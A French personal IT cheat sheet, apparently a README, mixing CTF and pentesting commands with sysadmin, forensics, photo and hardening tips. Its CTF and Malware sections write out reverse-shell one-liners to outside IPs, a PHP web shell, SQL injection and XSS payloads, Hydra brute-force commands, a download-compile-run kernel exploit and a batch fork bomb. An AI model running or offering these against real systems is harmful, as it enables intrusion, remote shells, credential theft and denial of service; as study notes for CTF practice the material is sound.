# Useful

> Le but de ce document est de regrouper les différents informations à propos de l'IT dans un seul répository accessible de partout

## CTF

- Reverse shell PHP --> [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
	- `<?php system($_GET["cmd"]) ?>`
	- https://www.revshells.com/
	- Par internet --> https://dashboard.ngrok.com/get-started/setup

- [Simple-PHP-Web-Shell](https://github.com/artyuum/simple-php-web-shell)
- [Reverse shell assisté](https://github.com/t0thkr1s/revshellgen)
- [Liste en plusieurs language Reverse shell](https://www.synetis.com/etablir-un-reverse-shell-en-une-ligne/)
	- `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("81.253.72.139",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
	- Spawn a meilleur shell --> `python -c 'import pty;pty.spawn ("/bin/bash")'`
	- Spawn un shell root --> `python3 -c 'import pty,os; os.setuid(0);os.setgid(0);pty.spawn("/bin/bash")'`
	- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.1 1234 >/tmp/f`

- [Bypass extension](https://d00mfist.gitbooks.io/ctf/content/bypass_image_upload.html)

- `bash -i >& /dev/tcp/10.8.218.133/80 0>&1` --> Elévation de privilèges

### Tools

- [BugBountyTool](https://github.com/vavkamil/awesome-bugbounty-tools) (regroupe les tools CTF)

- [Moonwalk](https://github/moonwalk/mufeedvh/moonwalk) --> efface les traces après des actions sur un système

### Payload

- ' or 1=1- - --> Bypass authentification web
	- [Payload](https://github.com/payloadbox/sql-injection-payload-list)
	- Mary' union select 1,2,3,4,5,@@version#

- SQLMap --> `sqlmap -u http://192.168.56.109/cgi-bin/badstore.cgi?action=loginregister --dbs --batch searchquery`
	- https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
	- Avec burp copie de la requête POST (mettre la requête dans le fichier)
		- sqlmap -r r.txt --batch --dbs
		- sqlmap -r r.txt --batch -D Staff --tables
		- sqlmap -r r.txt --batch -D Staff -T Users -C Username,Password --dump

	- sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3


- [Xss Payload](https://github.com/payloadbox/xss-payload-list) --> Payload XSS
	- `<iframe src="javascript:alert('xss')">`
	
## BruteForce
### Hydra

- Password WEB --> `hydra -l molly -P rockyou.txt 10.10.212.76 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -V`

- Password SSH --> `hydra -l molly -P rockyou.txt 10.10.212.76 ssh`
	- Port spécifique --> `hydra -s 1234 -l paul -P rockyou.txt 192.168.1.1 ssh`

- Password FTP --> `hydra -l chris -P /usr/share/wordlist/rockyou.txt 10.10.150.97 ftp`

### Crack hash

- Crack ZIP --> `zip2john X.zip > zip.hashes \n
john zip.hashes`

- Crack clé RSA SSH --> `ssh2john.py secretKey > id_rsa.hash \n john --wordlist=dict.txt id_rsa.hash`

- Crack d'une clé SHA256 avec `hascat` --> `hashcat -m 1400 -D 1,2 -a 3 -i --increment-min 1 --increment-max 10 -1 ?l?u?d b0c83cbeff5e6e61cfc00eb4c1802289c9514d5328d718484a4eb195266e14a4 ?1?1?1?1?1?1?1?1?1`
	- https://www.malekal.com/hashcat-cracker-des-hashs-empreintes-md5-sha1-sha256/

	
## Scan

### Passif 

- Nslookup/dig
- TheHarvester (énumération DNS) --> `theHarvester -d mokoil.com -e 8.8.8.8 -c -n`

- Table ARP

- [Shodan](https://www.shodan.io/)
- [Onyphe](https://www.onyphe.io/)
- [GreyNoise](https://viz.greynoise.io/)
- https://dorkgpt.com/

### Actif 
- Voir les ports ouverts --> `nmap -Pn 192.168.1.1`
- Voir la version des services --> `nmap -sV -sC 192.168.1.1`
- Voir tout les ports --> `sudo nmap -sS -p- 192.168.1.1`
- Pour le web --> `nikto -h http://172.16.28.230/`
	- Port knocking : `for x in 7469 8475 9842; do nmap -Pn --max-retries 0 -p $x 172.16.28.247; done` ou `knock 192.168.33.5 -v 7469 8475 9842`

- Wordpress --> `wpscan --url www.mokoil.com`
	- En mode agressif --> `wpscan --url www.mokoil.com -e vp,vt,u`
	- Faire un brute-force sur les mots de passe --> `wpscan --url http://<target-IP>/ --passwords wordlist.txt --usernames victor`

- [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

- WAF --> `wafw00f http://rainbowstore2.chall.malicecyber.com/ `

## Directory

- Gobuster --> `gobuster dir -u http://10.10.96.122 -w /usr/share/wordlists/dirb/common.txt`
- Dirb --> `dirb http://mypage.com`
	- Chercher des extensions --> `dirb http://172.16.28.230/ -X .txt .php`
- Fuzz --> `ffuf -w /usr/share/wordlists/wfuzz/webservices/ws-dirs.txt -ac -v -u http://172.16.28.230/FUZZ -recursion -r`

## Linux - Commande

- Monter USB --> `mount /dev/usbNAME /media/usb`
  - Trouver sa clé USB --> `sudo blkid` ou `df -h`
  
- Monter serveur python --> `python3 -m http.server 555 --bind 192.168.1.1`
   - Croc --> Envoyer des fichiers entre 2 PC

- `kali-undercover` --> transforme le GUI en Windows

- `last` --> dernière connexion
- `lastb` --> dernière connexion qui à échoué

- `find / -name XXX 2>/dev/null` --> trouver un fichier dans le système

- `lastlog` --> Voir les différents comptes et leurs dernières connexions

- Pour **compresser avec tar** --> `tar -czvf logs_archive.tar.gz ./*`
    - il est possible de supprimer les fichiers après compressions --> `tar -czvf logs_archive.tar.gz ./* --remove-files`
- Pour **décompresser avec tar** --> `tar -xzvf logs_archive.tar.gz`

- Pour **décompresser avec gz** --> `gunzip -d ficher.gz`
		
- `scp Alcasar-v3.2.ova root@192.168.100.40:/root/Alcasar-v3.2.ova` --> envoyer un fichier via ssh
- `scp -r root@192.168.100.1:/root/ /home/mathis` --> récupérer un fichier via ssh
	 
- Mettre une adresse IP statique sur Ubuntu --> `/etc/netplan/01-netcfg.yaml` (attention fichier `.yaml` donc sensible aux indentations/espaces) :

`	
network:
  version: 2
  renderer: networkd
  ethernets:
    enp0s3:
     dhcp4: no
     addresses: [192.168.1.233/24]
     gateway4: 192.168.1.1
     nameservers:
       addresses: [8.8.8.8]`
       
- Mettre une adresse IP statique Debian --> `/etc/network/interfaces` :

`iface enp0s3 inet static
     address 192.168.1.2/24
     gateway 192.168.1.1`
       
- Shutdown now --> `sudo shutdown -h now`

- Clear history --> `history -c`


## Bash - Linux

- Récupérer le X caratères d'une string --> `cut -c 8-19`

- Récupérer les X derniers caratères d'une string --> `tail  -c 6`

## Windows - Commande

- Trouver le mot de passe wifi --> `netsh wlan show profiles "Bbox-R&T" key=clear`

- `dir C:\*.ova /S | more` --> Recherche dans le système un fichier .ova

- `netstat -anpe` --> Tout les flux actifs actutellement

- TronScript --> Evalue le PC et remonte les problèmes

- `powercfg /batteryreport` --> Sort un rapport sur l'état de la batterie (à faire en powershell)

- `ipconfig /displaydns | find X` --> voir les recherches DNS

## Malware

### Tools

- [Virus Total](https://www.virustotal.com/gui/home/upload) --> étudier un fichier

- MRT --> Analyse PC (application au sein de Windows)

- HOIC --> Attaque DDOS

- [GTFObins](https://gtfobins.github.io/) (liste de binaires vulnérables avec POC)
	- Lister les SUIDS --> `find / -perm /4000 2>/dev/null`

- [USB Payload](https://github-wiki-see.page/m/hak5darren/USB-Rubber-Ducky/wiki/Payloads) (liste payloads pour attaque via USB)

- Browerling --> Permet de sandboxer un lien 
- OnWorks --> Sandbox de distribution Linux au sein du naviguateur
- [Sandbox](https://sandboxie-plus.com/) --> Sandbox standalone

- Test PC (tronScript) --> [Tron](https://www.reddit.com/r/TronScript/wiki/downloads/)

- Kernel exploit --> `wget https://raw.githubusercontent.com/kkamagui/linux-kernel-exploits/master/kernel-4.10.0-28-generic/CVE-2017-16995/CVE-2017-16995.c && gcc CVE-2017–16995.c -o CVE-2017–16995 && ./CVE-2017-16995`

- Analyser un mail --> https://mailheader.org/


### Windows 

- `ECHO@OFF start` (mettre le fichier en .bat) --> lance des choses à la suite

- `%0|%0` (mettre le fichier en .bat) --> Ralentis l'ordinateur

- Simple file Locker --> Mettre un un mdp sur des fichiers/dossiers

## Forensics

- OsForensics --> Fouiller un PC

- BleachBit --> Supprime les fichiers de façon définitive

- TestDisk --> Recover Data

- MVT --> analyse de téléphone

- Medicat --> Fait sauter les mots de passe

- Kon Boot --> Supprime le mot de passe à la volée

- APKLeaks --> Projet qui scanne une application Android

- [MagicNumbers](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5)

- Dump de Ram VirtualBox --> https://www.ired.team/miscellaneous-reversing-forensics/dump-virtual-box-memory
	- VBoxManage.exe debugvm "memento" dumpvmcore --filename C:\Users\mletot\Desktop\dump.raw

## OSINT

- [Script G-Hunt](https://github.com/mxrch/GHunt) --> Rassemble les informations à partir d'une adresse mail google

- [NexFil](https://github.com/thewhiteh4t/nexfil) --> Trouve les réseaux sociaux d'une personne

- [29a](https://29a.ch/photo-forensics) --> Analyse de photo forensics

- Exif Pilot --> Ajout de donnéees exif à une photo

- Google dorks --> https://usersearch.org/updates/2023/02/05/the-ultimate-google-dorking-cheatcheat-2023/?amp=1

- Trouver des identifiants --> https://bugmenot.com/

- Recherche sur Mail & Téléphone --> https://epieos.com/

- https://intelx.io/

## Photo

- Real Esrgan --> améliore la qualité des photos
- [ImgUpscaler](https://www.imgupscaler.com/) --> Site qui améliore la qualité
- [Resizer.in](https://imageresizer.com/) --> Augmente/Diminue une image en gardant la qualité
	
- [Hama](https://www.hama.app/) --> Efface une personne ou un objet sur une image

- [Pixel]([https://github.com/ORB-HD/deface](https://www.facepixelizer.com/fr/)) --> Flouter des visages

- [Polarr](https://photoeditor.polarr.com/) --> Outil de retouche en ligne

- Vérifier qu'il n'y a pas de ZIP dans une photo --> `binwalk -e cutie.png`

- [ExifCleaner](https://exifcleaner.com/) --> Enlève les données exif

- Travailler sur une photo stégano
	- https://stegonline.georgeom.net/
	- [aperisolve](https://www.aperisolve.com/)

- Enlever les watermarks --> https://www.watermarkremover.io/fr/upload

- Enlever le background --> https://www.remove.bg/

## Dessin

- [Tldraw](https://www.tldraw.com/) --> faire des shcémas


## Backup

- Pika Backup

- Auto Archiver

- Redo Rescue

- [MeeroDrop](https://www.meerodrop.com/) --> Transfert de fichier jusqu'à 20 Go

- Blomp --> Cloud jusqu'a 200 Go

- [ufile](https://ufile.io/) --> Dépôt de fichier 5 Go

## Other

- Barrier --> permet d'avoir plusieurs PC sur 1 PC

- Locust --> Test de montée en charge

- DroidCam --> Transforme le téléphone en Webcam

- Automata --> Automatise des tâches Web
	
- Upload files --> [File IO](https://www.file.io/)
- partage de fichier via Tor --> [OnionShare](https://github.com/onionshare/onionshare)

- Find movie --> `"Titre du film" -inurl(html|htm|php|txt) intitle: index.of "last modified" (mp4|avi)`

## Admin Sys

- [Server World](https://www.server-world.info/en/)
- [Liste de documentation](https://docs.liam-le-may.fr/)

- [Crontab](https://crontab.guru/)

- VboxAdditions (mettre la VM en full écran) --> `sudo sh ./VBoxLinuxAdditions.run --nox11`

- Surveiller des fichiers 
	- `watch -n 10 tail /var/log/access.log`
	- `tail -f /var/log/access.log`
	- Plusieurs fichiers --> `tail -f /var/log/auth.log /var/log/fail2ban.log`

- REGEX pour trouver des IPs --> `grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt`

- [Code Retour bash](https://debian-facile.org/doc:programmation:shells:script-bash-etat-de-sorie-et-les-tests)

- Trouver une machine quand on a pas son IP --> `netdiscover -r 10.0.2.0/24`

- [Calcul CVSS](https://cvss.js.org/)

- Modification date Linux --> `date +%T -s "10:13:13"`
	- `timedatectl set-timezone "Europe/Paris"`

- Vérification fichier yaml --> https://onlineyamltools.com/validate-yaml

- Générer des tableaux --> https://www.tablesgenerator.com/

- Dévrerouiler BIOS --> https://bios-pw.org/

## Hardening

- Connexion clé ssh (`PAM authentification` & `password authentification no`)


- Si on a une DMZ mettre en place un bastion (serveur qui sécurise tout ce qui a derrière)


- Désactiver root et avoir un autre compte avec sudo (`permit root login no`)


- Désactiver open ssl server si pas nécessaire


- Mettre en place fail2ban


- Avoir le firewall iptables :


	- `iptables -A INPUT -i eth0 -p tcp --dport 22 -m state NEW,ESTABLISHED -j ACCEPT`
	  --> Ce qui rentre sur le serveur (INPUT) via l'interface ETH0 avec le protocole TCP et le port de DESTINATION 22 on l'accepte

	- `iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state ESTABLISHED -j ACCEPT`
	  --> Ce qui sort du serveur (OUTPUT) via l'interface ETH0 avec le protocole TCP et le port de SORTIE 22 on l'accepte

	- `iptables -P INPUT DROP`
	  --> Tout ce qui rentre pas dans les critères on le drop


- Mettre en place les backups

- Mot de passe dans le Bios
 
- Désactiver l'USB

- [AutoPWN](https://github.com/GamehunterKaan/AutoPWN-Suite) --> script qui détecte les vulnérabilités
- [SecureWeb](https://doubletake.fr/securiser-simplement-son-serveur.html) --> Guide de sécurisation

- Script [CIS](https://github.com/ovh/debian-cis) ou [Lynis](https://github.com/CISOfy/Lynis)
